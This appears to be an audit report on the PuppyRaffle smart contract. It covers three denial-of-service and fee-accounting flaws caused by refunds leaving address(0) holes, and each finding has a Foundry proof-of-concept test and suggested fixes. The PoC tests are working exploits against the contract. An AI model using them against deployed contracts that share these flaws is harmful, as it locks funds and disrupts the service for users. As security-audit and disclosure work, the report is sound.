# 4 puppy raffle audit - Findings Report
## Commit hash: 3ff0f0bfddf25fd0c160fe57388fa6ff2e0f0960

##Findings by Pattern


 **Derived From** : Pot/fees mis-accounted via players.length; fees get stuck and raffle DoS

[M-1]. Fees accounting diverges from real balance after refunds; withdrawFees() is permanently bricked
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
Poc Test Status: AllTestPass
[M-2]. Refund holes inflate pot above actual balance; selectWinner() reverts and bricks the round
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
Poc Test Status: AllTestPass
[M-3]. Multiple refunds create duplicate address(0) entries; enterRaffle() permanently reverts on duplicate check
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless
Poc Test Status: AllTestPass


### Number of Findings
- C: 0
- H: 0
- M: 3
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Pot/fees mis-accounted via players.length; fees get stuck and raffle DoS

## [M-1]. Fees accounting diverges from real balance after refunds; withdrawFees() is permanently bricked

## Derived From Pattern/Invariant
Pot/fees mis-accounted via players.length; fees get stuck and raffle DoS

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: AllTestPass
## Minimim Privilege Required
Permissionless

## Description
selectWinner() increments totalFees by 20% of players.length*entranceFee, even if a portion of those players refunded. After a successful selection with R refunds, the contract overpays the prize by R*entranceFee relative to collected funds, making address(this).balance = totalFees - R*entranceFee. withdrawFees() requires address(this).balance == totalFees and thus reverts forever after any round with refunds. Vulnerable snippets: selectWinner: uint256 totalAmountCollected = players.length * entranceFee; uint256 fee = (totalAmountCollected * 20) / 100; totalFees = totalFees + uint64(fee); withdrawFees: require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

## Impact
Protocol fees become permanently un-withdrawable (funds locked) after any refunded round that still completes.

## Command to Run Test
forge test --match-path test/M-Fees-accounting-diverges-from-real-balan.t.sol -vvv

## Proof of Concept
An attacker (or normal users) can trigger a round with N entries and R refunds (R <= 20% of N), then finalize the round ensuring the winner index lands on a non-refunded slot. Because selectWinner() computes fee/prize from players.length (N) while the real pot is N-R tickets, the contract pays prize = 0.8*N*fee and accrues totalFees += 0.2*N*fee, leaving the contract balance short by R*fee. After players are cleared, withdrawFees() requires address(this).balance == totalFees and will revert forever since balance = totalFees - R*fee. Subsequent rounds do not heal the deficit; the mismatch remains totalFees - address(this).balance = R*fee across all future rounds.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FeesAccountingDivergenceTest is Test {
    PuppyRaffle public puppyRaffle;
    address public feeAddress;
    address public player1;
    address public player2;
    address public player3;
    address public player4;
    address public player5;
    
    uint256 public constant ENTRANCE_FEE = 1 ether;
    uint256 public constant RAFFLE_DURATION = 1 days;
    
    function setUp() public {
        feeAddress = address(uint160(uint256(keccak256("feeAddress"))));
        player1 = address(uint160(uint256(keccak256("player1"))));
        player2 = address(uint160(uint256(keccak256("player2"))));
        player3 = address(uint160(uint256(keccak256("player3"))));
        player4 = address(uint160(uint256(keccak256("player4"))));
        player5 = address(uint160(uint256(keccak256("player5"))));
        
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, RAFFLE_DURATION);
        
        // Fund players using hoax for 0.7.6 compatibility
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
        vm.deal(player3, 10 ether);
        vm.deal(player4, 10 ether);
        vm.deal(player5, 10 ether);
    }
    
    receive() external payable {}
    
    function testFeesAccountingDivergenceAfterRefunds() public {
        // Step 1: Enter 5 players into the raffle
        address[] memory p1 = new address[](1);
        p1[0] = player1;
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(p1);
        
        address[] memory p2 = new address[](1);
        p2[0] = player2;
        vm.prank(player2);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(p2);
        
        address[] memory p3 = new address[](1);
        p3[0] = player3;
        vm.prank(player3);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(p3);
        
        address[] memory p4 = new address[](1);
        p4[0] = player4;
        vm.prank(player4);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(p4);
        
        address[] memory p5 = new address[](1);
        p5[0] = player5;
        vm.prank(player5);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(p5);
        
        // Verify 5 players entered and contract has 5 ETH
        assertEq(address(puppyRaffle).balance, 5 ether);
        
        // Step 2: Player 5 refunds their ticket
        uint256 player5Index = puppyRaffle.getActivePlayerIndex(player5);
        vm.prank(player5);
        puppyRaffle.refund(player5Index);
        
        // After refund, contract should have 4 ETH (5 - 1 refunded)
        assertEq(address(puppyRaffle).balance, 4 ether);
        
        // Step 3: Fast forward time to allow winner selection
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);
        
        // Step 4: Select winner
        // The contract will calculate fees based on players.length (5) not actual funds (4 ETH)
        // totalAmountCollected = 5 * 1 ether = 5 ether
        // fee = 5 ether * 20% = 1 ether
        // prizePool = 5 ether * 80% = 4 ether
        // But actual balance is only 4 ether!
        
        uint256 balanceBeforeWinner = address(puppyRaffle).balance;
        uint64 totalFeesBeforeWinner = puppyRaffle.totalFees();
        
        puppyRaffle.selectWinner();
        
        // After selectWinner:
        // - Winner receives 4 ether (80% of 5 ether calculated)
        // - totalFees incremented by 1 ether (20% of 5 ether calculated)
        // - But contract only had 4 ether, so balance is now 0
        // - totalFees = 1 ether but balance = 0
        
        uint256 balanceAfterWinner = address(puppyRaffle).balance;
        uint64 totalFeesAfterWinner = puppyRaffle.totalFees();
        
        // The accounting divergence:
        // totalFees should equal balance when no active players, but it doesn't
        assertEq(uint256(totalFeesAfterWinner), 1 ether, "totalFees should be 1 ether");
        assertEq(balanceAfterWinner, 0 ether, "balance should be 0 ether after winner paid");
        
        // Step 5: Demonstrate withdrawFees is now permanently bricked
        // withdrawFees requires: address(this).balance == uint256(totalFees)
        // But balance (0) != totalFees (1 ether)
        
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        puppyRaffle.withdrawFees();
        
        // Even in subsequent rounds, this mismatch persists
        // Let's run another round to show the deficit carries forward
        
        // Enter 4 new players
        address[] memory newP1 = new address[](1);
        newP1[0] = player1;
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(newP1);
        
        address[] memory newP2 = new address[](1);
        newP2[0] = player2;
        vm.prank(player2);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(newP2);
        
        address[] memory newP3 = new address[](1);
        newP3[0] = player3;
        vm.prank(player3);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(newP3);
        
        address[] memory newP4 = new address[](1);
        newP4[0] = player4;
        vm.prank(player4);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(newP4);
        
        // Contract now has 4 ether from new entries
        assertEq(address(puppyRaffle).balance, 4 ether);
        
        // Fast forward and select winner again
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);
        puppyRaffle.selectWinner();
        
        // After second round:
        // - 4 ether pot: 3.2 ether to winner, 0.8 ether to fees
        // - totalFees = 1 + 0.8 = 1.8 ether
        // - balance = 0.8 ether
        // - Still mismatched by 1 ether from the first round!
        
        uint64 finalTotalFees = puppyRaffle.totalFees();
        uint256 finalBalance = address(puppyRaffle).balance;
        
        assertEq(uint256(finalTotalFees), 1.8 ether, "totalFees should be 1.8 ether after two rounds");
        assertEq(finalBalance, 0.8 ether, "balance should be 0.8 ether");
        
        // The deficit persists: totalFees - balance = 1 ether (the refunded amount)
        assertEq(uint256(finalTotalFees) - finalBalance, 1 ether, "Permanent 1 ether deficit from refund");
        
        // withdrawFees still reverts
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        puppyRaffle.withdrawFees();
    }
}

## Suggested Mitigation
- Compute prize/fee from the actual active pot, not players.length.
  Options:
  1) Derive pot from active players: iterate players[] to count non-zero addresses (or maintain an activeCount/refundedCount during enter/refund) and set pot = activeCount * entranceFee; fee = pot * 20% and prize = pot - fee.
  2) Alternatively, derive pot from funds excluding already accrued fees: pot = address(this).balance - totalFees; then fee = pot * 20% and prize = pot - fee. In Solidity 0.7.x, ensure no underflow if address(this).balance < totalFees (e.g., require(address(this).balance >= totalFees) or clamp pot to 0) and consider forced ETH via selfdestruct.

- Keep withdrawFees() invariant aligned with accounting: after paying prize, the remaining balance should equal updated totalFees. With the corrected fee/pot calculation, the existing equality check can remain; otherwise, update logic to withdraw only min(totalFees, address(this).balance) and set totalFees -= withdrawn to resync state.

- Prefer tracking per-round accounting explicitly (e.g., currentRoundPot) to avoid reliance on players.length or raw balance, and reset this state on round rollover.


## [M-2]. Refund holes inflate pot above actual balance; selectWinner() reverts and bricks the round

## Derived From Pattern/Invariant
Pot/fees mis-accounted via players.length; fees get stuck and raffle DoS

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: AllTestPass
## Minimim Privilege Required
Permissionless

## Description
refund() blanks entries with address(0) but does not shrink players.length. selectWinner() derives pot/fees from players.length, not the number of active (non-zero) players. When >20% of entries refund, prizePool = 80% * players.length * entranceFee can exceed the actual ETH left (only non-refunded contributions), causing the prize transfer to fail and selectWinner() to revert. Vulnerable snippets: refund: players[playerIndex] = address(0); selectWinner: uint256 totalAmountCollected = players.length * entranceFee; uint256 prizePool = (totalAmountCollected * 80) / 100; uint256 fee = (totalAmountCollected * 20) / 100;

## Impact
selectWinner() can be deterministically DoS’ed when refunded holes exceed 20% of players.length: the function computes prizePool from players.length instead of the number of active players, so prizePool > address(this).balance and the native transfer reverts. The round cannot complete or reset; fee withdrawal is also blocked until the round completes or all players refund. Active players can recover their own funds via refund(), so this is service disruption rather than direct asset theft.

## Command to Run Test
forge test --match-path test/M-Refund-holes-inflate-pot-above-actual-ba.t.sol -vvv

## Proof of Concept
- Let entranceFee = 1 ETH and N = 10 players; contract balance = 10 ETH.
- 3 players call refund(), which blanks their slots but does not shrink players.length. Balance becomes 7 ETH, players.length remains 10.
- After duration, selectWinner() computes totalAmountCollected = 10 * 1 = 10 ETH, prizePool = 8 ETH, fee = 2 ETH, even though only 7 ETH from active players remains in balance.
- The contract attempts to transfer 8 ETH to the winner while only holding 7 ETH (ignoring any prior fees), causing the value transfer to revert. The round is bricked until enough new entries are added to dilute refunds back to ≤20% of players.length, or all players refund out.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundHolesInflatePotTest is Test {
    PuppyRaffle public puppyRaffle;
    address public feeAddress;
    uint256 public entranceFee = 1 ether;
    uint256 public raffleDuration = 1 days;
    
    address public player1;
    address public player2;
    address public player3;
    address public player4;
    address public player5;
    address public player6;
    address public player7;
    address public player8;
    address public player9;
    address public player10;
    
    function setUp() public {
        feeAddress = address(uint160(uint256(keccak256("feeAddress"))));
        player1 = address(uint160(uint256(keccak256("player1"))));
        player2 = address(uint160(uint256(keccak256("player2"))));
        player3 = address(uint160(uint256(keccak256("player3"))));
        player4 = address(uint160(uint256(keccak256("player4"))));
        player5 = address(uint160(uint256(keccak256("player5"))));
        player6 = address(uint160(uint256(keccak256("player6"))));
        player7 = address(uint160(uint256(keccak256("player7"))));
        player8 = address(uint160(uint256(keccak256("player8"))));
        player9 = address(uint160(uint256(keccak256("player9"))));
        player10 = address(uint160(uint256(keccak256("player10"))));
        
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
    }
    
    function testRefundHolesInflatePotAboveBalance() public {
        // Setup: 10 players enter the raffle
        address[] memory players = new address[](10);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = player4;
        players[4] = player5;
        players[5] = player6;
        players[6] = player7;
        players[7] = player8;
        players[8] = player9;
        players[9] = player10;
        
        // Fund all players
        for (uint256 i = 0; i < 10; i++) {
            vm.deal(players[i], 10 ether);
        }
        
        // All 10 players enter
        for (uint256 i = 0; i < 10; i++) {
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = players[i];
            vm.prank(players[i]);
            puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        }
        
        // Verify contract balance is 10 ETH
        assertEq(address(puppyRaffle).balance, 10 ether, "Initial balance should be 10 ETH");
        
        // 3 players refund (30% of players)
        vm.prank(player1);
        puppyRaffle.refund(0);
        
        vm.prank(player2);
        puppyRaffle.refund(1);
        
        vm.prank(player3);
        puppyRaffle.refund(2);
        
        // Verify contract balance is now 7 ETH (10 - 3 refunds)
        assertEq(address(puppyRaffle).balance, 7 ether, "Balance after refunds should be 7 ETH");
        
        // Verify players.length is still 10 (holes not removed)
        assertEq(puppyRaffle.players(0), address(0), "Player 0 should be address(0)");
        assertEq(puppyRaffle.players(1), address(0), "Player 1 should be address(0)");
        assertEq(puppyRaffle.players(2), address(0), "Player 2 should be address(0)");
        
        // Fast forward time past raffle duration
        vm.warp(block.timestamp + raffleDuration + 1);
        
        // Attempt to select winner - this should revert
        // selectWinner calculates:
        // totalAmountCollected = 10 * 1 ether = 10 ether
        // prizePool = 10 ether * 80 / 100 = 8 ether
        // But contract only has 7 ether!
        
        vm.expectRevert();
        puppyRaffle.selectWinner();
        
        // Demonstrate the accounting mismatch
        // The contract thinks it should pay 8 ETH prize + 2 ETH fee = 10 ETH total
        // But it only has 7 ETH available
        // This causes selectWinner to revert, bricking the raffle
    }
    
    function testRefundHolesExactly20PercentStillWorks() public {
        // Edge case: exactly 20% refunds should still work (barely)
        address[] memory players = new address[](10);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = player4;
        players[4] = player5;
        players[5] = player6;
        players[6] = player7;
        players[7] = player8;
        players[8] = player9;
        players[9] = player10;
        
        for (uint256 i = 0; i < 10; i++) {
            vm.deal(players[i], 10 ether);
        }
        
        for (uint256 i = 0; i < 10; i++) {
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = players[i];
            vm.prank(players[i]);
            puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        }
        
        // Only 2 players refund (20%)
        vm.prank(player1);
        puppyRaffle.refund(0);
        
        vm.prank(player2);
        puppyRaffle.refund(1);
        
        // Balance is 8 ETH, prizePool will be exactly 8 ETH
        assertEq(address(puppyRaffle).balance, 8 ether);
        
        vm.warp(block.timestamp + raffleDuration + 1);
        
        // This should work (barely) because 8 ETH balance >= 8 ETH prize
        // But it's still wrong accounting - fees can't be withdrawn
        puppyRaffle.selectWinner();
    }
    
    function testRefundHolesOver20PercentBricksRaffle() public {
        // Demonstrate that >20% refunds always brick the raffle
        address[] memory players = new address[](5);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = player4;
        players[4] = player5;
        
        for (uint256 i = 0; i < 5; i++) {
            vm.deal(players[i], 10 ether);
        }
        
        for (uint256 i = 0; i < 5; i++) {
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = players[i];
            vm.prank(players[i]);
            puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        }
        
        // 2 out of 5 refund (40%)
        vm.prank(player1);
        puppyRaffle.refund(0);
        
        vm.prank(player2);
        puppyRaffle.refund(1);
        
        // Balance: 3 ETH
        // Calculated prizePool: 5 * 1 * 0.8 = 4 ETH
        // 4 ETH > 3 ETH -> revert
        
        vm.warp(block.timestamp + raffleDuration + 1);
        
        vm.expectRevert();
        puppyRaffle.selectWinner();
    }
}

## Suggested Mitigation
- Do not derive pot/fees from players.length. Instead, compute availablePot = address(this).balance - totalFees (using the pre-increment totalFees value) and set prize = 80% of availablePot and fee = 20% of availablePot.
- Ensure the winner is selected from active participants only. Recommended: maintain a compact players array by using a mapping address => index and swap-and-pop on refund; or track an activeCount and a separate active players list without holes. Also update the duplicate-checking to use a mapping for O(1) membership.
- Optionally, disallow refunds after raffle end time to reduce last-minute manipulation of the active set.
- Add a require that the selected winner != address(0) (which becomes unnecessary if you eliminate holes).


## [M-3]. Multiple refunds create duplicate address(0) entries; enterRaffle() permanently reverts on duplicate check

## Derived From Pattern/Invariant
Pot/fees mis-accounted via players.length; fees get stuck and raffle DoS

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: AllTestPass
## Minimim Privilege Required
Permissionless

## Description
refund() sets players[playerIndex] = address(0). After two or more refunds, the array contains multiple identical address(0) entries. enterRaffle() pushes first, then runs a global O(n^2) duplicate check across the entire players[] and will detect address(0) == address(0), reverting with "PuppyRaffle: Duplicate player". This prevents adding new players and can stall recovery if selectWinner() is also blocked. Vulnerable snippets: refund: players[playerIndex] = address(0); enterRaffle duplicate loop over all players including zeros with require(players[i] != players[j]).

## Impact
Denial-of-service for new entries; protocol liveness impaired until a successful round reset.

## Command to Run Test
forge test --match-path test/M-Multiple-refunds-create-duplicate-addres.t.sol -vvv

## Proof of Concept
- Start a round and have at least two entrants call refund(), producing two address(0) holes.
- Any subsequent enterRaffle() call will revert on the global duplicate check because it sees duplicate address(0) entries.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MultipleRefundsDuplicateAddressZeroTest is Test {
    PuppyRaffle public puppyRaffle;
    address public feeAddress;
    uint256 public entranceFee = 1e18;
    uint256 public raffleDuration = 1 days;
    
    address public player1;
    address public player2;
    address public player3;
    address public newPlayer;
    
    function setUp() public {
        // Create test addresses
        player1 = address(uint160(uint256(keccak256("player1"))));
        player2 = address(uint160(uint256(keccak256("player2"))));
        player3 = address(uint160(uint256(keccak256("player3"))));
        newPlayer = address(uint160(uint256(keccak256("newPlayer"))));
        feeAddress = address(uint160(uint256(keccak256("feeAddress"))));
        
        // Deploy PuppyRaffle
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
        
        // Fund players - using call instead of vm.deal for 0.7.6 compatibility
        payable(player1).transfer(10 ether);
        payable(player2).transfer(10 ether);
        payable(player3).transfer(10 ether);
        payable(newPlayer).transfer(10 ether);
    }
    
    function testMultipleRefundsCreateDuplicateAddressZeroAndBlockNewEntries() public {
        // Step 1: Three players enter the raffle
        address[] memory players = new address[](3);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
        
        // Verify all players are in the raffle
        assertEq(puppyRaffle.players(0), player1);
        assertEq(puppyRaffle.players(1), player2);
        assertEq(puppyRaffle.players(2), player3);
        
        // Step 2: Player1 requests a refund
        uint256 player1BalanceBefore = player1.balance;
        vm.prank(player1);
        puppyRaffle.refund(0);
        
        // Verify player1 got refunded and slot is now address(0)
        assertEq(player1.balance, player1BalanceBefore + entranceFee);
        assertEq(puppyRaffle.players(0), address(0));
        
        // Step 3: Player2 requests a refund
        uint256 player2BalanceBefore = player2.balance;
        vm.prank(player2);
        puppyRaffle.refund(1);
        
        // Verify player2 got refunded and slot is now address(0)
        assertEq(player2.balance, player2BalanceBefore + entranceFee);
        assertEq(puppyRaffle.players(1), address(0));
        
        // Now we have TWO address(0) entries in the players array
        // players[0] = address(0)
        // players[1] = address(0)
        // players[2] = player3
        
        // Step 4: Try to enter a new player - this should REVERT
        // because the duplicate check will find address(0) == address(0)
        address[] memory newPlayers = new address[](1);
        newPlayers[0] = newPlayer;
        
        vm.prank(newPlayer);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        puppyRaffle.enterRaffle{value: entranceFee}(newPlayers);
        
        // Step 5: Demonstrate the DoS - even player3 (still active) cannot enter again
        address[] memory player3Again = new address[](1);
        player3Again[0] = player3;
        
        vm.prank(player3);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        puppyRaffle.enterRaffle{value: entranceFee}(player3Again);
    }
    
    function testDemonstrateExactDuplicateCheckFailure() public {
        // This test explicitly shows the duplicate check logic failure
        
        // Enter 4 players
        address[] memory players = new address[](4);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = address(uint160(uint256(keccak256("player4"))));
        payable(players[3]).transfer(10 ether);
        
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Refund first two players to create two address(0) entries
        vm.prank(player1);
        puppyRaffle.refund(0);
        
        vm.prank(player2);
        puppyRaffle.refund(1);
        
        // Array state:
        // [address(0), address(0), player3, player4]
        
        // The duplicate check in enterRaffle does:
        // for (i = 0; i < players.length - 1; i++)
        //   for (j = i + 1; j < players.length; j++)
        //     require(players[i] != players[j])
        //
        // When i=0, j=1: players[0] == players[1] => address(0) == address(0) => REVERT
        
        address[] memory newPlayerArray = new address[](1);
        newPlayerArray[0] = newPlayer;
        
        vm.prank(newPlayer);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        puppyRaffle.enterRaffle{value: entranceFee}(newPlayerArray);
        
        // Protocol is now in DoS state - no new players can enter
    }
    
    // Helper to fund addresses in setUp
    receive() external payable {}
}

## Suggested Mitigation
- Remove refunded players by swap-and-pop and maintain an address->index mapping to avoid address(0) holes.
- Alternatively, ignore address(0) entries in the duplicate check.
- Best: track active players in a mapping and eliminate the O(n^2) global duplicate scan.



